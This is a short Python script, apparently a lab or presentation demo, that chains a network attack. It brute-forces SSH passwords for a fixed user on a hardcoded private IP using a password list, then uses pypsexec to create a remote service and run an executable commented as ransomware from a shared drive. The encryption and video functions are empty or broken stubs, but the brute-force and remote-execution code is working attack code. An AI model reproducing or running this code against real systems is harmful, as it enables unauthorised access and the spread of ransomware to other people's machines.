#!/usr/bin/env python3

import os
import paramiko #Bruteforcing SSH connection
import time #Bruteforcing SSH connection
from pypsexec.client import Client #Sending remote commands


    
#def encrypt file
def ransom():
    os.system()

#play video
def playVideo():
    os.system("cd C:\\Users\\IEUser\\Downloads")

# sniff network 
def sniffNetwork():
    #IPAdress to second Windows 7 machine to speed up presentation
    ipAddress= '192.168.0.60'
    return ipAddress

#bruteforce
def bruteForce(user, ipAddress):
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ipAddress, username="IEUser", password=secret)
            return secret

        except:
            time.sleep(1)
            print(secret)

#Transfer
def transferFile():
    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder

#Remote execute file
def remoteExecute(ipAddress, user, password):
    c = Client(ipAddress, username=user, password=password,  encrypt=False)
    c.connect()
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
    except:
        print("done")

def main():
    user= "IEUser"
    ransom()
    playVideo()
    ipAddress= sniffNetwork()
    print(ipAddress)
    password=bruteForce(user,ipAddress)
    print(password)
    remoteExecute(ipAddress,user, password)
main()